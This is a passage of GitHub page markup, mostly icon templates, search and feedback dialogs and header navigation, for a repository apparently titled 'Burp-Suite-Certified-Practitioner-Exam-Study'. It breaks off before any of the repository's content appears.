0 1 2 0Z"></path>
</svg>
</template>

<template id="shield-check-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield-check">
    <path d="m8.533.133 5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667l5.25-1.68a1.748 1.748 0 0 1 1.066 0Zm-.61 1.429.001.001-5.25 1.68a.251.251 0 0 0-.174.237V7c0 1.36.275 2.666 1.057 3.859.784 1.194 2.121 2.342 4.366 3.298a.196.196 0 0 0 .154 0c2.245-.957 3.582-2.103 4.366-3.297C13.225 9.666 13.5 8.358 13.5 7V3.48a.25.25 0 0 0-.174-.238l-5.25-1.68a.25.25 0 0 0-.153 0ZM11.28 6.28l-3.5 3.5a.75.75 0 0 1-1.06 0l-1.5-1.5a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l.97.97 2.97-2.97a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
</template>

<template id="heart-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-heart">
    <path d="m8 14.25.345.666a.75.75 0 0 1-.69 0l-.008-.004-.018-.01a7.152 7.152 0 0 1-.31-.17 22.055 22.055 0 0 1-3.434-2.414C2.045 10.731 0 8.35 0 5.5 0 2.836 2.086 1 4.25 1 5.797 1 7.153 1.802 8 3.02 8.847 1.802 10.203 1 11.75 1 13.914 1 16 2.836 16 5.5c0 2.85-2.045 5.231-3.885 6.818a22.066 22.066 0 0 1-3.744 2.584l-.018.01-.006.003h-.002ZM4.25 2.5c-1.336 0-2.75 1.164-2.75 3 0 2.15 1.58 4.144 3.365 5.682A20.58 20.58 0 0 0 8 13.393a20.58 20.58 0 0 0 3.135-2.211C12.92 9.644 14.5 7.65 14.5 5.5c0-1.836-1.414-3-2.75-3-1.373 0-2.609.986-3.029 2.456a.749.749 0 0 1-1.442 0C6.859 3.486 5.623 2.5 4.25 2.5Z"></path>
</svg>
</template>

<template id="server-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-server">
    <path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v4c0 .372-.116.717-.314 1 .198.283.314.628.314 1v4a1.75 1.75 0 0 1-1.75 1.75H1.75A1.75 1.75 0 0 1 0 12.75v-4c0-.358.109-.707.314-1a1.739 1.739 0 0 1-.314-1v-4C0 1.784.784 1 1.75 1ZM1.5 2.75v4c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-4a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Zm.25 5.75a.25.25 0 0 0-.25.25v4c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-4a.25.25 0 0 0-.25-.25ZM7 4.75A.75.75 0 0 1 7.75 4h4.5a.75.75 0 0 1 0 1.5h-4.5A.75.75 0 0 1 7 4.75ZM7.75 10h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM3 4.75A.75.75 0 0 1 3.75 4h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 3 4.75ZM3.75 10h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5Z"></path>
</svg>
</template>

<template id="globe-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-globe">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM5.78 8.75a9.64 9.64 0 0 0 1.363 4.177c.255.426.542.832.857 1.215.245-.296.551-.705.857-1.215A9.64 9.64 0 0 0 10.22 8.75Zm4.44-1.5a9.64 9.64 0 0 0-1.363-4.177c-.307-.51-.612-.919-.857-1.215a9.927 9.927 0 0 0-.857 1.215A9.64 9.64 0 0 0 5.78 7.25Zm-5.944 1.5H1.543a6.507 6.507 0 0 0 4.666 5.5c-.123-.181-.24-.365-.352-.552-.715-1.192-1.437-2.874-1.581-4.948Zm-2.733-1.5h2.733c.144-2.074.866-3.756 1.58-4.948.12-.197.237-.381.353-.552a6.507 6.507 0 0 0-4.666 5.5Zm10.181 1.5c-.144 2.074-.866 3.756-1.58 4.948-.12.197-.237.381-.353.552a6.507 6.507 0 0 0 4.666-5.5Zm2.733-1.5a6.507 6.507 0 0 0-4.666-5.5c.123.181.24.365.353.552.714 1.192 1.436 2.874 1.58 4.948Z"></path>
</svg>
</template>

<template id="issue-opened-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened">
    <path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path>
</svg>
</template>

<template id="device-mobile-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-device-mobile">
    <path d="M3.75 0h8.5C13.216 0 14 .784 14 1.75v12.5A1.75 1.75 0 0 1 12.25 16h-8.5A1.75 1.75 0 0 1 2 14.25V1.75C2 .784 2.784 0 3.75 0ZM3.5 1.75v12.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25h-8.5a.25.25 0 0 0-.25.25ZM8 13a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path>
</svg>
</template>

<template id="package-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-package">
    <path d="m8.878.392 5.25 3.045c.54.314.872.89.872 1.514v6.098a1.75 1.75 0 0 1-.872 1.514l-5.25 3.045a1.75 1.75 0 0 1-1.756 0l-5.25-3.045A1.75 1.75 0 0 1 1 11.049V4.951c0-.624.332-1.201.872-1.514L7.122.392a1.75 1.75 0 0 1 1.756 0ZM7.875 1.69l-4.63 2.685L8 7.133l4.755-2.758-4.63-2.685a.248.248 0 0 0-.25 0ZM2.5 5.677v5.372c0 .09.047.171.125.216l4.625 2.683V8.432Zm6.25 8.271 4.625-2.683a.25.25 0 0 0 .125-.216V5.677L8.75 8.432Z"></path>
</svg>
</template>

<template id="credit-card-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-credit-card">
    <path d="M10.75 9a.75.75 0 0 0 0 1.5h1.5a.75.75 0 0 0 0-1.5h-1.5Z"></path><path d="M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25ZM14.5 6.5h-13v5.75c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25Zm0-2.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25V5h13Z"></path>
</svg>
</template>

<template id="play-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path>
</svg>
</template>

<template id="gift-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-gift">
    <path d="M2 2.75A2.75 2.75 0 0 1 4.75 0c.983 0 1.873.42 2.57 1.232.268.318.497.668.68 1.042.183-.375.411-.725.68-1.044C9.376.42 10.266 0 11.25 0a2.75 2.75 0 0 1 2.45 4h.55c.966 0 1.75.784 1.75 1.75v2c0 .698-.409 1.301-1 1.582v4.918A1.75 1.75 0 0 1 13.25 16H2.75A1.75 1.75 0 0 1 1 14.25V9.332C.409 9.05 0 8.448 0 7.75v-2C0 4.784.784 4 1.75 4h.55c-.192-.375-.3-.8-.3-1.25ZM7.25 9.5H2.5v4.75c0 .138.112.25.25.25h4.5Zm1.5 0v5h4.5a.25.25 0 0 0 .25-.25V9.5Zm0-4V8h5.5a.25.25 0 0 0 .25-.25v-2a.25.25 0 0 0-.25-.25Zm-7 0a.25.25 0 0 0-.25.25v2c0 .138.112.25.25.25h5.5V5.5h-5.5Zm3-4a1.25 1.25 0 0 0 0 2.5h2.309c-.233-.818-.542-1.401-.878-1.793-.43-.502-.915-.707-1.431-.707ZM8.941 4h2.309a1.25 1.25 0 0 0 0-2.5c-.516 0-1 .205-1.43.707-.337.392-.646.975-.879 1.793Z"></path>
</svg>
</template>

<template id="code-square-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-square">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25Zm7.47 3.97a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L10.69 8 9.22 6.53a.75.75 0 0 1 0-1.06ZM6.78 6.53 5.31 8l1.47 1.47a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215l-2-2a.75.75 0 0 1 0-1.06l2-2a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
</template>

<template id="device-desktop-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-device-desktop">
    <path d="M14.25 1c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.752.752 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5C0 1.784.784 1 1.75 1ZM1.75 2.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25ZM9.018 12H6.982a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5Z"></path>
</svg>
</template>

        <div class="position-relative">
                <ul
                  role="listbox"
                  class="ActionListWrap QueryBuilder-ListWrap"
                  aria-label="Suggestions"
                  data-action="
                    combobox-commit:query-builder#comboboxCommit
                    mousedown:query-builder#resultsMousedown
                  "
                  data-target="query-builder.resultsList"
                  data-persist-list=false
                  id="query-builder-test-results"
                  tabindex="-1"
                ></ul>
        </div>
      <div class="FormControl-inlineValidation" id="validation-d0f29f35-5c6d-4ac5-852d-5d40aeaba3b3" hidden="hidden">
        <span class="FormControl-inlineValidation--visual">
          <svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg>
        </span>
        <span></span>
</div>    </div>
    <div data-target="query-builder.screenReaderFeedback" aria-live="polite" aria-atomic="true" class="sr-only"></div>
</query-builder></form>
          <div class="d-flex flex-row color-fg-muted px-3 text-small color-bg-default search-feedback-prompt">
            <a target="_blank" href="https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax" data-view-component="true" class="Link color-fg-accent text-normal ml-2">Search syntax tips</a>            <div class="d-flex flex-1"></div>
          </div>
        </div>
</div>

    </div>
</modal-dialog></div>
  </div>
  <div data-action="click:qbsearch-input#retract" class="dark-backdrop position-fixed" hidden data-target="qbsearch-input.darkBackdrop"></div>
  <div class="color-fg-default">
    
<dialog-helper>
  <dialog data-target="qbsearch-input.feedbackDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" id="feedback-dialog" aria-modal="true" aria-labelledby="feedback-dialog-title" aria-describedby="feedback-dialog-description" data-view-component="true" class="Overlay Overlay-whenNarrow Overlay--size-medium Overlay--motion-scaleFade Overlay--disableScroll">
    <div data-view-component="true" class="Overlay-header">
  <div class="Overlay-headerContentWrap">
    <div class="Overlay-titleWrap">
      <h1 class="Overlay-title " id="feedback-dialog-title">
        Provide feedback
      </h1>
        
    </div>
    <div class="Overlay-actionWrap">
      <button data-close-dialog-id="feedback-dialog" aria-label="Close" aria-label="Close" type="button" data-view-component="true" class="close-button Overlay-closeButton"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg></button>
    </div>
  </div>
  
</div>
      <scrollable-region data-labelled-by="feedback-dialog-title">
        <div data-view-component="true" class="Overlay-body">        <!-- '"` --><!-- </textarea></xmp> --></option></form><form id="code-search-feedback-form" data-turbo="false" action="/search/feedback" accept-charset="UTF-8" method="post"><input type="hidden" data-csrf="true" name="authenticity_token" value="+Hdg2Bew/R5ld4cOW0jrR6S6RcttuiMfipokpVW/RY2ARF8yytaw7h6aVZY31jUqqXd49Ot8WXWqEBUViAnL9g==" />
          <p>We read every piece of feedback, and take your input very seriously.</p>
          <textarea name="feedback" class="form-control width-full mb-2" style="height: 120px" id="feedback"></textarea>
          <input name="include_email" id="include_email" aria-label="Include my email address so I can be contacted" class="form-control mr-2" type="checkbox">
          <label for="include_email" style="font-weight: normal">Include my email address so I can be contacted</label>
</form></div>
      </scrollable-region>
      <div data-view-component="true" class="Overlay-footer Overlay-footer--alignEnd">          <button data-close-dialog-id="feedback-dialog" type="button" data-view-component="true" class="btn">    Cancel
</button>
          <button form="code-search-feedback-form" data-action="click:qbsearch-input#submitFeedback" type="submit" data-view-component="true" class="btn-primary btn">    Submit feedback
</button>
</div>
</dialog></dialog-helper>

    <custom-scopes data-target="qbsearch-input.customScopesManager">
    
<dialog-helper>
  <dialog data-target="custom-scopes.customScopesModalDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" id="custom-scopes-dialog" aria-modal="true" aria-labelledby="custom-scopes-dialog-title" aria-describedby="custom-scopes-dialog-description" data-view-component="true" class="Overlay Overlay-whenNarrow Overlay--size-medium Overlay--motion-scaleFade Overlay--disableScroll">
    <div data-view-component="true" class="Overlay-header Overlay-header--divided">
  <div class="Overlay-headerContentWrap">
    <div class="Overlay-titleWrap">
      <h1 class="Overlay-title " id="custom-scopes-dialog-title">
        Saved searches
      </h1>
        <h2 id="custom-scopes-dialog-description" class="Overlay-description">Use saved searches to filter your results more quickly</h2>
    </div>
    <div class="Overlay-actionWrap">
      <button data-close-dialog-id="custom-scopes-dialog" aria-label="Close" aria-label="Close" type="button" data-view-component="true" class="close-button Overlay-closeButton"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg></button>
    </div>
  </div>
  
</div>
      <scrollable-region data-labelled-by="custom-scopes-dialog-title">
        <div data-view-component="true" class="Overlay-body">        <div data-target="custom-scopes.customScopesModalDialogFlash"></div>

        <div hidden class="create-custom-scope-form" data-target="custom-scopes.createCustomScopeForm">
        <!-- '"` --><!-- </textarea></xmp> --></option></form><form id="custom-scopes-dialog-form" data-turbo="false" action="/search/custom_scopes" accept-charset="UTF-8" method="post"><input type="hidden" data-csrf="true" name="authenticity_token" value="ziglZE2AwU5NexLVvz/dTwcmcvaUDf/gv5HbqxBH9B6b0NwjKxFZEhJq2KFAsOrKUp+8zrb5aFQGxCU6VYOQGQ==" />
          <div data-target="custom-scopes.customScopesModalDialogFlash"></div>

          <input type="hidden" id="custom_scope_id" name="custom_scope_id" data-target="custom-scopes.customScopesIdField">

          <div class="form-group">
            <label for="custom_scope_name">Name</label>
            <auto-check src="/search/custom_scopes/check_name" required>
              <input
                type="text"
                name="custom_scope_name"
                id="custom_scope_name"
                data-target="custom-scopes.customScopesNameField"
                class="form-control"
                autocomplete="off"
                placeholder="github-ruby"
                required
                maxlength="50">
              <input type="hidden" data-csrf="true" value="pzYIjD0oMByXqa6LDG4fgvvxb+PrVaGBsfuOBcqGgz+xY1OIzk3PtDLGYQZ16jGQIoT6SmfZYX94MSAo5Wp/FA==" />
            </auto-check>
          </div>

          <div class="form-group">
            <label for="custom_scope_query">Query</label>
            <input
              type="text"
              name="custom_scope_query"
              id="custom_scope_query"
              data-target="custom-scopes.customScopesQueryField"
              class="form-control"
              autocomplete="off"
              placeholder="(repo:mona/a OR repo:mona/b) AND lang:python"
              required
              maxlength="500">
          </div>

          <p class="text-small color-fg-muted">
            To see all available qualifiers, see our <a class="Link--inTextBlock" href="https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax">documentation</a>.
          </p>
</form>        </div>

        <div data-target="custom-scopes.manageCustomScopesForm">
          <div data-target="custom-scopes.list"></div>
        </div>

</div>
      </scrollable-region>
      <div data-view-component="true" class="Overlay-footer Overlay-footer--alignEnd Overlay-footer--divided">          <button data-action="click:custom-scopes#customScopesCancel" type="button" data-view-component="true" class="btn">    Cancel
</button>
          <button form="custom-scopes-dialog-form" data-action="click:custom-scopes#customScopesSubmit" data-target="custom-scopes.customScopesSubmitButton" type="submit" data-view-component="true" class="btn-primary btn">    Create saved search
</button>
</div>
</dialog></dialog-helper>
    </custom-scopes>
  </div>
</qbsearch-input>


            <div class="position-relative HeaderMenu-link-wrap d-lg-inline-block">
              <a
                href="/login?return_to=https%3A%2F%2Fgithub.com%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study%3Futm_source%3Dchatgpt.com"
                class="HeaderMenu-link HeaderMenu-link--sign-in HeaderMenu-button flex-shrink-0 no-underline d-none d-lg-inline-flex border border-lg-0 rounded px-2 py-1"
                style="margin-left: 12px;"
                data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a0e23657a72dba32dbf9a8e0064cf0a84bddadb13ababe9ee337abd6445edef8"
                data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to go to homepage&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Sign in;ref_loc:Header&quot;}"
              >
                Sign in
              </a>
            </div>

              <a href="/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&amp;source=header-repo&amp;source_repo=botesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study"
                class="HeaderMenu-link HeaderMenu-link--sign-up HeaderMenu-button flex-shrink-0 d-flex d-lg-inline-flex no-underline border color-border-default rounded px-2 py-1"
                data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a0e23657a72dba32dbf9a8e0064cf0a84bddadb13ababe9ee337abd6445edef8"
                data-analytics-event="{&quot;category&quot;:&quot;Sign up&quot;,&quot;action&quot;:&quot;click to sign up for account&quot;,&quot;label&quot;:&quot;ref_page:/&lt;user-name&gt;/&lt;repo-name&gt;;ref_cta:Sign up;ref_loc:header logged out&quot;}"
              >
                Sign up
              </a>

                <div class="AppHeader-appearanceSettings">
    <react-partial-anchor>
      <button data-target="react-partial-anchor.anchor" id="icon-button-03c5307d-9097-4b4c-893e-8c03904f1d3c" aria-labelledby="tooltip-de42626f-666d-455f-8375-a1bd9eec315e" type="button" disabled="disabled" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium AppHeader-button HeaderMenu-link border cursor-wait">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-sliders Button-visual">
    <path d="M15 2.75a.75.75 0 0 1-.75.75h-4a.75.75 0 0 1 0-1.5h4a.75.75 0 0 1 .75.75Zm-8.5.75v1.25a.75.75 0 0 0 1.5 0v-4a.75.75 0 0 0-1.5 0V2H1.75a.75.75 0 0 0 0 1.5H6.5Zm1.25 5.25a.75.75 0 0 0 0-1.5h-6a.75.75 0 0 0 0 1.5h6ZM15 8a.75.75 0 0 1-.75.75H11.5V10a.75.75 0 1 1-1.5 0V6a.75.75 0 0 1 1.5 0v1.25h2.75A.75.75 0 0 1 15 8Zm-9 5.25v-2a.75.75 0 0 0-1.5 0v1.25H1.75a.75.75 0 0 0 0 1.5H4.5v1.25a.75.75 0 0 0 1.5 0v-2Zm9 0a.75.75 0 0 1-.75.75h-6a.75.75 0 0 1 0-1.5h6a.75.75 0 0 1 .75.75Z"></path>
</svg>
</button><tool-tip id="tooltip-de42626f-666d-455f-8375-a1bd9eec315e" for="icon-button-03c5307d-9097-4b4c-893e-8c03904f1d3c" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Appearance settings</tool-tip>

      <template data-target="react-partial-anchor.template">
        <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.fbf61c683a537e8f92d5.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/appearance-settings.753d458774a2f782559b.module.css" />

<react-partial
  partial-name="appearance-settings"
  data-ssr="false"
  data-attempted-ssr="false"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>


      </template>
    </react-partial-anchor>
  </div>

          <button type="button" class="sr-only js-header-menu-focus-trap d-block d-lg-none">Resetting focus</button>
        </div>
      </div>
    </div>
  </div>
</header>

      <div hidden="hidden" data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
  
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-switched" hidden>You switched accounts on another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>

    <button id="icon-button-d217fb58-eb8f-421c-8deb-aad967cc047e" aria-labelledby="tooltip-02b6f42c-9f25-487a-94d1-f4ef3134ca1f" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</button><tool-tip id="tooltip-02b6f42c-9f25-487a-94d1-f4ef3134ca1f" for="icon-button-d217fb58-eb8f-421c-8deb-aad967cc047e" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Dismiss alert</tool-tip>


  
</div>
    </div>

  <div id="start-of-content" class="show-on-focus"></div>








    <div id="js-flash-container" class="flash-container" data-turbo-replace>




  <template class="js-flash-template">
    
<div class="flash flash-full   {{ className }}">
  <div >
    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    <div aria-atomic="true" role="alert" class="js-flash-alert">
      
      <div>{{ message }}</div>

    </div>
  </div>
</div>
  </template>
</div>


    






  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
    data-project-hovercards-enabled
  >
        <div itemscope itemtype="http://schema.org/SoftwareSourceCode" class="">
    <main id="js-repo-pjax-container" >
      
  





    






  

  <div id="repository-container-header"  class="pt-3 hide-full-screen" style="background-color: var(--page-header-bgColor, var(--color-page-header-bg));" data-turbo-replace>

      <div class="d-flex flex-nowrap flex-justify-end mb-3  px-3 px-lg-5" style="gap: 1rem;">

        <div class="flex-auto min-width-0 width-fit">
            
  <div class=" d-flex flex-wrap flex-items-center wb-break-word f3 text-normal">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo color-fg-muted mr-2">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
    
    <span class="author flex-self-stretch" itemprop="author">
      <a class="url fn" rel="author" data-hovercard-type="user" data-hovercard-url="/users/botesjuan/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/botesjuan">
        botesjuan
</a>    </span>
    <span class="mx-1 flex-self-stretch color-fg-muted">/</span>
    <strong itemprop="name" class="mr-2 flex-self-stretch">
      <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study">Burp-Suite-Certified-Practitioner-Exam-Study</a>
    </strong>

    <span></span><span class="Label Label--secondary v-align-middle mr-1">Public</span>
  </div>


        </div>

        <div id="repository-details-container" class="flex-shrink-0" data-turbo-replace style="max-width: 70%;">
            <ul class="pagehead-actions flex-shrink-0 d-none d-md-inline" style="padding: 2px 0;">
    
      

  <li>
